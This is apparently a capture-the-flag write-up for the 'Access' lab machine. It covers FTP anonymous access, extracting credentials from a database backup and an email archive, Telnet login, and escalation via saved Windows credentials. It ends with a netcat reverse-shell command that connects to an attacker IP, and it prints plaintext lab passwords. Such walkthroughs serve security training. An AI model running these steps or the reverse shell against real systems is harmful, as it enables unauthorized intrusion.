# Access

## Summary

* Only three ports open: `FTP (21)`, `Telnet (23)`, and `HTTP (80)` running Microsoft IIS 7.5.
* Anonymous login to FTP revealed two files: a password-protected ZIP and a backup `.mdb` database.
* Extracted valid user credentials from the `.mdb` file using an online viewer.
* Used `engineer` creds to unlock the ZIP file, which contained a `.pst` email archive.
* The PST file disclosed new credentials for the user `security`: `4Cc3ssC0ntr0ller`.
* Logged in via Telnet as `security` and enumerated stored credentials using `cmdkey`.
* Escalated privileges using `runas` with saved credentials for `Administrator`.



***

## Enumeration

```bash
sudo nmap -A -sC -sN -p- -T4 -oN full.nmap 10.10.10.98
```

Discovered:

* FTP (`21`) → Anonymous login enabled.
* Telnet (`23`) → Exposed NTLM and version info (Windows XP).
* HTTP (`80`) → Default MegaCorp landing page (no obvious attack surface).

***

## Initial Foothold

#### FTP Enumeration

```bash
# Login as anonymous
ftp 10.10.10.98

# Found 2 files in FTP server
> 
Access Control.xip # Password Protected
backup.mdb

# To downlaod the fine, we change the config to binary on ftp

# finally used https://www.mdbopener.com/ to open the mdb backup file

# Got password in auth_user.csv
admin:admin
engineer:access4u@security
backup_admin:admin


# Opeing the zip file using Engineer creds
access4u@security

# used online pst viewer 
Hi there, 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

Regards,

John

# Got he password from the email of the user security
security
4Cc3ssC0ntr0ller
```

Downloaded files:

* `Access Control.zip` (password protected)
* `backup.mdb`

**Used** [**mdbopener.com**](https://www.mdbopener.com/) **to extract credentials:**

```
tadmin:admin
engineer:access4u@security
backup_admin:admin
```

Used `engineer` credentials to unlock ZIP file:

```bash
Password: access4u@security
```

Unzipped archive revealed an Outlook PST file → Viewed using an online PST viewer:

```
Email content:
The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.
```

***

#### Telnet Access

```bash
telnet -l security 10.10.10.98
# Password: 4Cc3ssC0ntr0ller
```

**Successfully logged in!**

***

### Privilege Escalation

#### Step 1: Check Stored Credentials

```cmd
cmdkey /list
```

Found saved credentials for:

* `ACCESS\Administrator`

***

#### Step 2: Use `runas` to Pivot as Administrator

```bash
runas.exe /user:ACCESS\Administrator /savecred "C:\windows\system32\cmd.exe"
```

Used Netcat to get full shell:

```bash
# Host listener
nc -lvnp 4444

# On victim
runas.exe /user:ACCESS\Administrator /savecred "c:\users\security\nc.exe -nc 10.10.16.2 4444 -e cmd.exe"
```

**Boom! SYSTEM shell obtained.**
